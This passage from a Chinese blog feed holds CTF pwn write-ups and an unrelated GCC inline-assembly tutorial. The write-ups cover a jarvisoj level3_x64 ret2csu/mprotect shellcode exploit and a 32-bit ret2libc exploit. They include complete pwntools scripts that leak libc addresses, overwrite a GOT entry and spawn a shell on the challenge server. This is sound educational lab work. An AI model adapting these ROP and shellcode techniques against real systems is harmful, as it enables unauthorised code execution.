在这里，给rbx+1，然后判断rbx和rbp大小， 我们想要顺利通过这里，不被<code>0x00000000004006a4 &lt;+84&gt;:    jne    0x400690 &lt;__libc_csu_init+64&gt;</code>循环卡死，所以在一开始设置rbx=0；rbp=1，就可以顺利通过这里。</p></li></ul><p><strong>不过很重要的一点！在完成整个ROPgadget的时候，最后一定要加上cyclic（0x38）来补位！，原因在于，当你执行这个gadget，实际上他不是按照正常流程执行的，0x4006aa到0x4006b4 这一段pop；ret的过程执行了两次，导致整个栈被抬高了 7*8=56个bytes，所以要做一个补位，才能达到真正的返回地址</strong>  </p><ul><li><p>给出我们的x64ROPgadget函数，把它写成一个函数，我们要多次利用</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_x64rop</span><span class="params">(func_got,arg1,arg2,arg3,returnData=False)</span>:</span></span><br><span class="line">    payload = flat(</span><br><span class="line">    cyclic(<span class="number">0x88</span>),   <span class="comment"># 溢出</span></span><br><span class="line">    p64(pop7ret),   </span><br><span class="line">    p64(<span class="number">0</span>),         </span><br><span class="line">    p64(<span class="number">1</span>),         <span class="comment"># rbp于rbx初始化</span></span><br><span class="line">    p64(func_got),  <span class="comment"># 我们要到达的目标函数的GOT位置</span></span><br><span class="line">    p64(arg3),</span><br><span class="line">    p64(arg2),</span><br><span class="line">    p64(arg1),      <span class="comment"># 参数准备</span></span><br><span class="line">    p64(mov3call),  <span class="comment"># 参数准备2</span></span><br><span class="line">    cyclic(<span class="number">0x38</span>),   <span class="comment"># 7*8补位</span></span><br><span class="line">    p64(vul_func_addr)  <span class="comment"># 返回地址</span></span><br><span class="line">    )</span><br><span class="line">    io.sendafter(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">    <span class="keyword">if</span> returnData == <span class="literal">True</span>:</span><br><span class="line">        Data = u64(io.recv(<span class="number">8</span>))   <span class="comment"># 需要leak地址时设为true</span></span><br><span class="line">        <span class="keyword">return</span> Data</span><br></pre></td></tr></table></figure></li><li><p>然后使用我们构造好的函数，首先leak出libc_base，拿到mprotect的真实地址</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc_base = _x64rop(write_got,<span class="number">1</span>,write_got,<span class="number">8</span>,<span class="literal">True</span>)-libc.sym[<span class="string">'write'</span>]</span><br><span class="line">mprotect = libc.sym[<span class="string">'mprotect'</span>]+libc_base</span><br><span class="line">log.success(<span class="string">"mprotect :%s"</span>%hex(mprotect))</span><br></pre></td></tr></table></figure></li><li><p>接下来，由于我们没有shellcode，我们需要手动读进来shellcode，然后放到bss段上，这里我们的func_got是read，然后第一个参数为0，代表stdin，bss_addr代表我们要向bss段读，然后读取生成的len(shellcode)个字节。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">_x64rop(read_got,<span class="number">0</span>,bss_addr,len(shellcode)) <span class="comment"># 将shellcode用read读入bss段</span></span><br><span class="line">io.send(shellcode)</span><br></pre></td></tr></table></figure></li><li><p>好了，现在我们有了shellcod了，但问题来了，看一下bss段的权限<br><img src="https://s1.ax1x.com/2020/04/30/Jq70Df.png" alt=""><br><img src="https://s1.ax1x.com/2020/04/30/Jq7lDK.png" alt=""><br>尴尬，bss段压根没有可执行权限啊。。好了，那我们需要用mprotect来手动改掉他的权限。</p></li></ul><ul><li><p>现在我们需要将bss段权限改掉，加上可执行权限。不过在这之前，我们还要做一件事情，我们需要将mprotect函数写进GOT表，替换掉一个got表中原有的函数（偷天换日），这样才能成功的调用mprotect来修改权限。这里我们使用read函数来读入，调用read_got，stdin，向本来存<code>__libc_start_main</code>的got位置，写进去8个字节，也就是把这个位置覆写掉，然后我们在<code>io.send(p64(mprotect))</code>向他发送mprotect的地址，此时read把这个mprotect的地址就读进去了。ok！覆写GOT成功。此时可以通过跳转到<code>__libc_start_main</code>来调用mprotect了。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_x64rop(read_got,<span class="number">0</span>,main_got,<span class="number">8</span>)              <span class="comment"># 用read在got表中main的地方覆盖为mprotect的地址，成功后可以通过got表调用mprotect</span></span><br><span class="line">io.send(p64(mprotect))</span><br></pre></td></tr></table></figure></li><li><p>接下来我们修改bss段为可执行权限。我们向__libc_start_main跳转，由于此时这个函数已经被覆写，实际我们跳转的位置是mprotect，OK，我们修改0x00600000起始，0x1000个字节地址权限为0x7（可执行），<strong>注意，这里一定是0x00600000开始，因为mprotect在修改时会做页对齐，如果我们不从一个对齐的位置修改，是达不到目的的。</strong><a href="https://blog.csdn.net/roland_sun/article/details/33728955" target="_blank" rel="noopener">关于mprotect</a></p></li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x64rop(main_got,<span class="number">0x00600000</span>,<span class="number">0x1000</span>,<span class="number">0x7</span>)     <span class="comment"># 修改bss段权限为可执行</span></span><br></pre></td></tr></table></figure><ul><li>好了！所有准备工作完毕，现在开始pwn！其实这里很简单,我们再做一次溢出然后直接跳到bss_addr的位置，也就是我们放shellcode的位置，因为此时bss段已经变为可执行的，那么程序会自动执行这个段上的内容。<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = flat(cyclic(<span class="number">0x88</span>),p64(bss_addr))       <span class="comment"># 直接跳到bss执行shellcode</span></span><br><span class="line">io.sendafter(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><h2 id="最终exp与结果"><a href="#最终exp与结果" class="headerlink" title="最终exp与结果"></a>最终exp与结果</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">elf = ELF(<span class="string">"./level3_x64"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line">pop7ret = <span class="number">0x00000000004006aa</span></span><br><span class="line">mov3call = <span class="number">0x0000000000400690</span></span><br><span class="line">vul_func_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_x64rop</span><span class="params">(func_got,arg1,arg2,arg3,returnData=False)</span>:</span></span><br><span class="line">    payload = flat(</span><br><span class="line">    cyclic(<span class="number">0x88</span>),   <span class="comment"># 溢出</span></span><br><span class="line">    p64(pop7ret),   </span><br><span class="line">    p64(<span class="number">0</span>),         </span><br><span class="line">    p64(<span class="number">1</span>),         <span class="comment"># rbp于rbx初始化</span></span><br><span class="line">    p64(func_got),  <span class="comment"># 我们要到达的目标函数的GOT位置</span></span><br><span class="line">    p64(arg3),</span><br><span class="line">    p64(arg2),</span><br><span class="line">    p64(arg1),      <span class="comment"># 参数准备</span></span><br><span class="line">    p64(mov3call),  <span class="comment"># 参数准备2</span></span><br><span class="line">    cyclic(<span class="number">0x38</span>),   <span class="comment"># 7*8补位</span></span><br><span class="line">    p64(vul_func_addr)  <span class="comment"># 返回地址</span></span><br><span class="line">    )</span><br><span class="line">    io.sendafter(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">    <span class="keyword">if</span> returnData == <span class="literal">True</span>:</span><br><span class="line">        Data = u64(io.recv(<span class="number">8</span>))   <span class="comment"># 需要leak地址时设为true</span></span><br><span class="line">        <span class="keyword">return</span> Data</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'0'</span>:</span><br><span class="line">    io = process(<span class="string">"./level3_x64"</span>,env = &#123;<span class="string">"LD_PRELOAD"</span>: <span class="string">"./libc-2.19.so"</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9884</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    libc_base = _x64rop(write_got,<span class="number">1</span>,write_got,<span class="number">8</span>,<span class="literal">True</span>)-libc.sym[<span class="string">'write'</span>]   <span class="comment"># leak基址</span></span><br><span class="line">    mprotect = libc.sym[<span class="string">'mprotect'</span>]+libc_base</span><br><span class="line">    log.success(<span class="string">"mprotect :%s"</span>%hex(mprotect))</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    shellcode = asm(shellcraft.sh())</span><br><span class="line">    _x64rop(read_got,<span class="number">0</span>,bss_addr,len(shellcode)) <span class="comment"># 将shellcode用read读入bss段</span></span><br><span class="line">    io.send(shellcode)</span><br><span class="line"></span><br><span class="line">    _x64rop(read_got,<span class="number">0</span>,main_got,<span class="number">8</span>)              <span class="comment"># 用read在got表中main的地方覆盖为mprotect的地址，成功后可以通过got表调用mprotect</span></span><br><span class="line">    io.send(p64(mprotect))</span><br><span class="line"></span><br><span class="line">    _x64rop(main_got,<span class="number">0x00600000</span>,<span class="number">0x1000</span>,<span class="number">0x7</span>)     <span class="comment"># 修改bss段权限为可执行</span></span><br><span class="line"></span><br><span class="line">    payload = flat(cyclic(<span class="number">0x88</span>),p64(bss_addr))       <span class="comment"># 直接跳到bss执行shellcode</span></span><br><span class="line">    io.sendafter(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/30/JqLnIO.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>一道经典的ret2lib</title>
    <link href="/2020/04/25/%E4%B8%80%E9%81%93%E7%BB%8F%E5%85%B8%E7%9A%84ret2lib/"/>
    <url>/2020/04/25/%E4%B8%80%E9%81%93%E7%BB%8F%E5%85%B8%E7%9A%84ret2lib/</url>
    
    <content type="html"><![CDATA[<p><del>最近心血来潮突然想整理一道经典的ret2libc</del>  </p><p><strong>废话不多说，直接开始</strong></p><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>在gdb中disas我们会看到这样一项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call 0x8048340 &lt;write@plt&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/25/JsmSVH.png" alt="avater"><br>这个<code>&lt;write@plt&gt;</code>实际并不是write的地址，只是一个过度的地址，这一项指向write在plt(Procedure Linkage Table)表中的地址，然后从plt表跳到got(Global Offset Table)表，最后在got表中的某一项拿到write的真正地址。这是一个多次跳转的过程。这是linux自身的一个运行时重定位的机制，简要来说，有一部分函数是在glibc中的。当程序启动后，glibc装载，而些需要的函数，在运行前实际上我们是不知道他的地址的，只有当真正运行起来，调用的时候才知道他真正的地址。<br>但这个时候又出现了一个问题，为什么我们不直接在运行时把<code>&lt;write@plt&gt;</code>替换成真正的write的地址呢，而是通过多次跳转找到真正的地址？这是因为，在现代操作系统中</p><ul><li>不允许修改代码段，只能修改数据段</li><li>如果write函数是在一个动态库（.so对象）内，修改了代码段，那么它就无法做到系统内所有进程共享同一个动态库。</li></ul><p>基于这些问题，<strong>write的地址只能回写到数据段内，而不能回写在代码段上</strong>，所以我们引入got和plt表的原因就很清楚了：</p><ul><li>plt表存放一小段额外的代码，他的任务是向got表中函数对应的表项跳转以获取数据段存放的函数地址。</li><li>got表可以看作一个存放函数地址的数据表，其中对应的表项存的是函数加载后真正的地址。请看简化后的图片：<br><img src="https://s1.ax1x.com/2020/04/25/JsKkxx.png" alt="avater2"><br>通过这个过程，我们就可以leak出函数真正的地址，然后加以利用。<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><img src="https://s1.ax1x.com/2020/04/25/JsQqGd.png" alt="avater4"><br>这个函数中调用了_read我们跟进去看一下<br><img src="https://s1.ax1x.com/2020/04/25/JslfYQ.png" alt="a"><br>我们最终到达了got表中的一个位置，这里解释一下<em>为什么有一个.got一个.got.plt</em></li><li>ELF将GOT拆分为两个表，”.got”和”.got.plt”。其中”.got”用来保存全局变量引用的地址，“.got.plt”用来保存函数引用的地址，对于外部函数的引用全部放在”.got.plt”中。</li></ul><p>也就是说这个<code>dd offset read</code> 才是我们最终要到达的地址。其他函数同理。<br>当你再一次进入got中的read，达到了这样一个地方：<br><img src="https://s1.ax1x.com/2020/04/25/Js1tcn.png" alt="b"><br>这里就是真正的read的地址了。<br><em>需要注意的是，当你的函数第一次被调用时，会先将真实地址写入GOT表，然后直接跳转到真实的地址执行。而当你接下来再次进行调用时就是按照：func@plt –&gt; func@got –&gt; func跳转了</em></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="程序概览"><a href="#程序概览" class="headerlink" title="程序概览"></a>程序概览</h3><ul><li>没有给我们bin/sh</li><li>没有给我们system或exec族函数等</li><li>提供so文件</li><li>有明显的栈溢出漏洞<br><img src="https://s1.ax1x.com/2020/04/25/JsMS6P.png" alt="avater3"><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3></li><li>从libc中拿到system和bin/sh的真实地址然后pwn<h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">劫持read函数 ---&gt; </span><br><span class="line">返回write函数 ---&gt; </span><br><span class="line">设置write函数返回地址为vulnerable_function ---&gt; </span><br><span class="line">fd设1，标准输出 ---&gt; buff指向read函数在got表中的真正位置 ---&gt; </span><br><span class="line">泄漏read函数的真实地址 ---&gt;  </span><br><span class="line">计算read函数与libc中read的offset ---&gt; </span><br><span class="line">加上offset拿到真实的system函数地址和&#x2F;bin&#x2F;sh的地址 ---&gt; </span><br><span class="line">二次rop，再次劫持read ---&gt; </span><br><span class="line">返回到system函数 ---&gt; </span><br><span class="line">填充垃圾返回地址 ---&gt; 参数为bin&#x2F;sh的真实地址 ---&gt; pwn</span><br></pre></td></tr></table></figure></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'0'</span>:</span><br><span class="line">    libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line">    io = process(<span class="string">"./level3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9879</span>)</span><br><span class="line">    libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   <span class="comment"># pattern = 'A'*(0x88+4)</span></span><br><span class="line">    write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"write@plt: "</span>,hex(write_plt)</span><br><span class="line">    read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">    vulnerable = elf.symbols[<span class="string">'vulnerable_function'</span>]   <span class="comment"># 0x804844b</span></span><br><span class="line">    return_add = vulnerable</span><br><span class="line">    payload_leak = flat(cyclic(<span class="number">0x88</span>+<span class="number">4</span>),p32(write_plt),p32(return_add),p32(<span class="number">1</span>),p32(read_got),p32(<span class="number">0x4</span>))</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">    io.send(payload_leak)</span><br><span class="line">    read_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"real read_addr: "</span>,hex(read_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    offset = read_addr - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">    system_addr = offset +  libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh_addr = offset + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"offset: "</span>,hex(offset)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"real system: "</span>,hex(system_addr)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"read string: "</span>,hex(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">    rop = flat(</span><br><span class="line">                cyclic(<span class="number">0x88</span>+<span class="number">4</span>),p32(system_addr),cyclic(<span class="number">4</span>),p32(bin_sh_addr)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">"Input:\n"</span>, rop)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="https://s1.ax1x.com/2020/04/25/JsJ1rn.png" alt="a"></p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>从一次偷懒学习内联汇编</title>
    <link href="/2020/04/03/%E4%BB%8E%E4%B8%80%E6%AC%A1%E5%81%B7%E6%87%92%E5%AD%A6%E4%B9%A0%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/"/>
    <url>/2020/04/03/%E4%BB%8E%E4%B8%80%E6%AC%A1%E5%81%B7%E6%87%92%E5%AD%A6%E4%B9%A0%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/</url>
    
    <content type="html"><![CDATA[<h1 id="从一次偷懒学习内联汇编"><a href="#从一次偷懒学习内联汇编" class="headerlink" title="从一次偷懒学习内联汇编"></a>从一次偷懒学习内联汇编</h1><ul><li>上一节汇编语言课上，老师让写出两个数做加法，最终PSW各个标志位，于是就想能不能偷个懒，写一段程序来自动输出PSW</li><li>环境：MacOS 10.15/gcc</li></ul><h2 id="一-基本格式"><a href="#一-基本格式" class="headerlink" title="一.基本格式"></a>一.基本格式</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">asm</span> [<span class="keyword">volatile</span>] ( Assembler Template</span><br><span class="line"></span><br><span class="line">                : Output Operands   <span class="comment">/* Optional */</span></span><br><span class="line">                : Input Operands    <span class="comment">/* Optional */</span></span><br><span class="line">                : Clobbers          <span class="comment">/* Optional */</span></span><br><span class="line">   )</span><br></pre></td></tr></table></figure><h2 id="Overall"><a href="#Overall" class="headerlink" title="Overall"></a>Overall</h2><p>在基本的内联汇编中，我们只有指令。但是当我们想进行更高级的操作比如：使用一些已经定义好的变量、输入一些指定的寄存器、或者输出到某些指定的寄存器，扩展内联汇编可以极大的简化我们的工作。（虽然他看起来有些晦涩</p><h3 id="一些解释"><a href="#一些解释" class="headerlink" title="一些解释"></a>一些解释</h3><ul><li>asm代表开始程序，<strong>volatile</strong>是一个可选参数，他告诉编译器：“你不要乱动我这里的代码啊！”防止由于gcc自身的优化而导致代码移动或改变位置等。( )中是我们具体的代码，其中：数字加%表示寄存器样板操作数，如：%1 换句话说，就是给寄存器起一个别名，这个别名是自然数标识的，最大到几取决于通用寄存器的数量。而我们在使用具体的寄存器时，格式为：%%寄存器，如 %%rax</li><li>Output Operands这一部分是指定输出的，比如输出到我们指定的变量中。当然了，输出部分要符合一定的约束或者格式：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:<span class="string">"=r"</span> (__var)</span><br></pre></td></tr></table></figure> 这算是比较常见的一种格式。”=r” 代表目标操作数即 %0 它可以是任意一个通用寄存器，%0是他的别名，并且变量__var 放在这个寄存器中。当然了我们的约束不仅有”=r”一种，<strong>其中，=是约束符号：只能写入，r代表约束代码：使用任何可用的通用寄存器</strong>，下面是一些总结。应当说明的是，这些约束的方式或写法仍然适合<em>Input Operands</em><br> <img src="https://s1.ax1x.com/2020/04/03/Gtorgs.png" alt="avatar"><br> <img src="https://s1.ax1x.com/2020/04/03/GtocD0.png" alt="avatar2"></li><li>Clobbers告诉系统：“我要修改、破坏某个寄存器的值，你不要乱用它”，如：%eax告诉GCC %eax的值将会在“asm”里被修改，所以GCC不会使用这个寄存器去存储其它的数值。</li></ul><h3 id="一些例子"><a href="#一些例子" class="headerlink" title="一些例子"></a>一些例子</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> data1 = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> data2 = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">int</span> result;</span><br><span class="line"></span><br><span class="line"><span class="keyword">asm</span>( <span class="string">"imull %%edx, %%ecx\n\t"</span></span><br><span class="line">      <span class="string">"movl %%ecx, %%eax"</span></span><br><span class="line">      : <span class="string">"=a"</span> ( result )             <span class="comment">//最终的结果放在result变量中，使用eax且只写</span></span><br><span class="line">      : <span class="string">"d"</span> (data1), <span class="string">"c"</span> (data2)    <span class="comment">//data1使用edx，data2使用ecx</span></span><br><span class="line">                                    <span class="comment">//我们没有修改某一个寄存器的值，换句话说，我们只定了要使用的寄存器</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>( <span class="string">"The result is %d\n"</span>, result );</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>   我们定义了data1和data2，想对他们做乘法同时使用指定的寄存器。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a=<span class="number">10</span>, b;</span><br><span class="line"><span class="keyword">asm</span> (<span class="string">"movl %1, %%eax;</span></span><br><span class="line"><span class="string">    movl %%eax, %0;"</span></span><br><span class="line">    :<span class="string">"=r"</span>(b)       <span class="comment">//输出到b变量，使用任意的通用寄存器，在代码中使用 %0 代替储存b变量的寄存器</span></span><br><span class="line">    :<span class="string">"r"</span>(a)        <span class="comment">//输入的是a变量，使用任意的通用寄存器，在代码中用 %1 来代替储存a变量的寄存器</span></span><br><span class="line">    :<span class="string">"%eax"</span>        <span class="comment">//我们破坏了%eax的值所以要告诉系统，这里不需要使用两个%%  </span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p> 那么出现了一个问题，如果一个变量既充当输入操作数，又充当输出操作数，应该怎么写呢？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">asm</span> ( <span class="string">"imull %1, %0"</span></span><br><span class="line">  : <span class="string">"=r"</span> ( data2 )</span><br><span class="line">  : <span class="string">"r"</span> ( data1 ), <span class="string">"0"</span> ( data2 ) ); <span class="comment">//标记“0” 告诉编译器使用第一个命名的寄存器存放data2即%0，这样确保将使用相同的寄存器保存输入值和输出值</span></span><br></pre></td></tr></table></figure><p>  当然了，你可能觉得使用%0，%1….很难区分到底是哪个变量，我们可以使用<strong>替换占位符</strong>解决这个问题，就是给变量来个别名。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[name] <span class="string">"constrint"</span> (variable)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">asm</span> ( <span class="string">"imul %[value1], %[value2]"</span></span><br><span class="line">      : [value2] <span class="string">"=r"</span> ( data2 )     <span class="comment">//[value2]是data2变量在代码中的别名，引用时加上%符号使用</span></span><br><span class="line">      : [value1] <span class="string">"r"</span> ( data1 ), <span class="string">"0"</span> ( data2 ) );</span><br></pre></td></tr></table></figure><h3 id="深入一些"><a href="#深入一些" class="headerlink" title="深入一些"></a>深入一些</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">asm</span> ( <span class="string">"divib %2\n\t"</span></span><br><span class="line">          <span class="string">"movl %%eax, %0"</span></span><br><span class="line">          : <span class="string">"=m"</span> ( result )                       <span class="comment">//写入result的内存位置</span></span><br><span class="line">          : <span class="string">"a"</span> ( dividend ), <span class="string">"m"</span> ( divisor ) );  <span class="comment">//被除数在eax中，除数使用内存位置，确定结果之后，他被传送到中它的内存位置中，而不是寄存器。</span></span><br><span class="line"><span class="built_in">printf</span>( <span class="string">"The result is %d\n"</span>, result );</span><br></pre></td></tr></table></figure><p> 这里我们并非直接使用寄存器，而是使用变量的内存位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 